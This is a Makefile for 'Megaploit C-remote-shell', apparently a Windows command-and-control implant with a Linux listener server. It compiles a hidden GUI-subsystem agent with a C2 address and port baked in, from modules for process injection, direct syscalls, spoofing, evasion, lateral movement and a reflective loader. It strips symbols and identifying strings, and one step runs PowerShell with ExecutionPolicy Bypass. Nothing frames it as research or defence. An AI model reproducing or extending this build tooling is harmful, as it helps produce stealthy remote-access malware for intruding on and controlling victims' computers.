# ============================================================================
# C-remote-shell â€” Makefile
# ============================================================================
# Builds the Megaploit C-remote-shell Windows EXE client using MSVC or MinGW.
#
# Targets
# -------
#   make              â€” auto-detect compiler, build client + server
#   make client       â€” build the client only
#   make server       â€” build the server only (serverShell.c, Windows)
#   make clean        â€” remove compiled binaries
#
# Compiler selection (in order of preference)
# --------------------------------------------
#   MSVC  â€” run from a "Developer Command Prompt for VS" (cl.exe in PATH)
#   MinGW â€” apt install mingw-w64 on Linux/macOS  (x86_64-w64-mingw32-gcc)
#
# Override via:
#   make CC=cl           (force MSVC)
#   make CC=x86_64-w64-mingw32-gcc  (force MinGW)
#
# Config overrides (patched into the compile via -D flags)
# ---------------------------------------------------------
#   make C2_IP=10.0.0.1 C2_PORT=4444
#
# Build requirements
# ------------------
#   Link: Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib
#         Advapi32.lib  User32.lib
# ============================================================================

# ---------------------------------------------------------------------------
# Auto-detect compiler
# ---------------------------------------------------------------------------

CC_MSVC   := cl
CC_MINGW  := x86_64-w64-mingw32-gcc

MSVC_OK   := $(shell $(CC_MSVC) 2>NUL; echo $$?)
MINGW_OK  := $(shell which $(CC_MINGW) 2>/dev/null)

ifeq ($(CC),)
  ifneq ($(MSVC_OK),)
    CC := $(CC_MSVC)
  else ifneq ($(MINGW_OK),)
    CC := $(CC_MINGW)
  else
    $(error No C compiler found. Install MSVC (Developer Command Prompt) or MinGW (apt install mingw-w64))
  endif
endif

# ---------------------------------------------------------------------------
# Configurable parameters
# ---------------------------------------------------------------------------

C2_IP    ?= 192.168.1.226
C2_PORT  ?= 50005
NAME     ?= megaploit_c_agent

# ---------------------------------------------------------------------------
# Source files
# ---------------------------------------------------------------------------

# Refactored client/ build (preferred)
CLIENT_SRCS := client/main.c             \
               client/spoof.c            \
               client/peb_walk.c         \
               client/syscall.c          \
               client/ntcalls.c          \
               client/shell.c            \
               client/handlers_system.c  \
               client/handlers_ui.c      \
               client/handlers_lateral.c \
               client/inject.c           \
               client/evasion.c          \
               tls/tls_client.c

# Reflective loader blob (auto-generated from loader.c before main build)
LOADER_BIN  := client/loader_func.bin
LOADER_OBJ  := client/loader.o
LOADER_BLOB := client/loader_blob.h

# Legacy single-file build (Source.c + shared tls/tls_client.c)
LEGACY_SRCS := Source.c tls/tls_client.c

# Refactored POSIX server (server/main.c + server/server.c + server/prompt.c)
# Compiled on Linux/macOS with native gcc â€” NOT with the Windows cross-compiler.
SERVER_REFACTORED_SRCS := server/main.c server/server.c server/prompt.c

# Legacy single-file POSIX server
SERVER_LEGACY_SRCS := serverShell.c

# ---------------------------------------------------------------------------
# MSVC flags
# ---------------------------------------------------------------------------

# /O1        â€” optimise for size (smaller than /O2 for agent use)
# /GS-       â€” disable stack buffer security cookies (saves ~1 KB overhead)
# /Gy        â€” function-level linking (linker can dead-strip unused funcs)
# /DNDEBUG   â€” strip asserts and debug strings
# /GL        â€” whole-program optimisation
# /link /OPT:REF /OPT:ICF â€” dead-code elimination at link time
MSVC_CFLAGS  := /nologo /W3 /O1 /GS- /Gy /GL /DNDEBUG \
                /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT)
MSVC_LDFLAGS := /OPT:REF /OPT:ICF /LTCG
MSVC_LIBS    := Secur32.lib Crypt32.lib ws2_32.lib bcrypt.lib Advapi32.lib User32.lib

# ---------------------------------------------------------------------------
# MinGW flags
# ---------------------------------------------------------------------------

# -Os          â€” optimise for size
# -s           â€” strip all symbols from the output binary
# -ffunction-sections / -fdata-sections + --gc-sections â€” dead code removal
# -fno-ident   â€” omit GCC version string from binary
# -fno-asynchronous-unwind-tables â€” strip .eh_frame / .pdata (saves ~10-15%)
# -mwindows    â€” GUI subsystem: no console window, no AllocConsole needed
MINGW_CFLAGS := -Os -s -DNDEBUG -DUNICODE -D_UNICODE -DSECURITY_WIN32 \
                -ffunction-sections -fdata-sections                     \
                -fno-ident -fno-asynchronous-unwind-tables              \
                -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
MINGW_LDFLAGS := -Wl,--gc-sections -Wl,--strip-all
MINGW_LIBS    := -lsecur32 -lcrypt32 -lws2_32 -lbcrypt -ladvapi32 -luser32 -mwindows

# ---------------------------------------------------------------------------
# Detect MSVC vs MinGW
# ---------------------------------------------------------------------------

ifeq ($(CC),$(CC_MSVC))
  # â”€â”€ MSVC â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  CLIENT_OUT := $(NAME).exe
  LEGACY_OUT := $(NAME)_legacy.exe
  SERVER_OUT := serverShell.exe

  client:
	$(CC) $(MSVC_CFLAGS) $(CLIENT_SRCS) /link $(MSVC_LDFLAGS) $(MSVC_LIBS) /out:$(CLIENT_OUT)
	@echo [+] Client built: $(CLIENT_OUT)

  legacy:
	$(CC) $(MSVC_CFLAGS) $(LEGACY_SRCS) /link $(MSVC_LDFLAGS) $(MSVC_LIBS) /out:$(LEGACY_OUT)
	@echo [+] Legacy client built: $(LEGACY_OUT)

  server:
	@echo [!] serverShell.c is a POSIX server -- compile on Linux with gcc, not MSVC.

  clean:
	-del /F /Q *.exe *.obj *.pdb *.ilk 2>NUL

else
  # â”€â”€ MinGW â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  CLIENT_OUT := $(NAME).exe
  LEGACY_OUT := $(NAME)_legacy.exe
  SERVER_OUT := serverShell.exe

  client: $(LOADER_BLOB)
	$(CC) $(MINGW_CFLAGS) $(CLIENT_SRCS) -o $(CLIENT_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
	@echo "[+] Client built: $(CLIENT_OUT)"

  $(LOADER_OBJ): client/loader.c client/loader.h
	$(CC) -O0 -fpic -fno-stack-protector -ffunction-sections -fno-asynchronous-unwind-tables -fno-ident -DWIN32_LEAN_AND_MEAN -c client/loader.c -o $(LOADER_OBJ)

  $(LOADER_BIN): $(LOADER_OBJ)
	objcopy --only-section='.text$$rfl_loader' -O binary $(LOADER_OBJ) $(LOADER_BIN)

  $(LOADER_BLOB): $(LOADER_BIN)
	powershell -NoProfile -ExecutionPolicy Bypass -File client/gen_loader_blob.ps1 -BinPath "$(LOADER_BIN)" -OutPath "$(LOADER_BLOB)"
	@echo "[+] Loader blob: $(LOADER_BLOB)"

  legacy:
	$(CC) $(MINGW_CFLAGS) $(LEGACY_SRCS) -o $(LEGACY_OUT) $(MINGW_LDFLAGS) $(MINGW_LIBS)
	@echo "[+] Legacy client built: $(LEGACY_OUT)"

  server:
	@echo "[!] serverShell.c is a POSIX server -- compile on Linux with: gcc serverShell.c -o serverShell"

  clean:
	rm -f *.exe
	-rm -f client/loader.o client/loader_func.bin client/loader_blob.h

endif

# ---------------------------------------------------------------------------
# POSIX server targets (Linux / macOS only â€” use native gcc, not MinGW)
# ---------------------------------------------------------------------------
# These targets are compiler-agnostic and always use the system gcc.
# They are intentionally NOT part of the default `all` target because they
# produce Linux ELFs, not Windows EXEs.
#
# Override the listen port via:
#   make server-posix LISTEN_PORT=4444

LISTEN_PORT ?= 50005

POSIX_CFLAGS := -O2 -Wall -Wextra -Werror=implicit-function-declaration \
                -DLISTEN_PORT=$(LISTEN_PORT)

server-posix:
	gcc $(POSIX_CFLAGS) $(SERVER_REFACTORED_SRCS) -o serverShell_refactored
	@echo "[+] Refactored server built: serverShell_refactored"

server-posix-legacy:
	gcc $(POSIX_CFLAGS) $(SERVER_LEGACY_SRCS) -o serverShell_legacy
	@echo "[+] Legacy server built: serverShell_legacy"

# ---------------------------------------------------------------------------
# Default target
# ---------------------------------------------------------------------------

all: client

.PHONY: all client legacy server server-posix server-posix-legacy clean
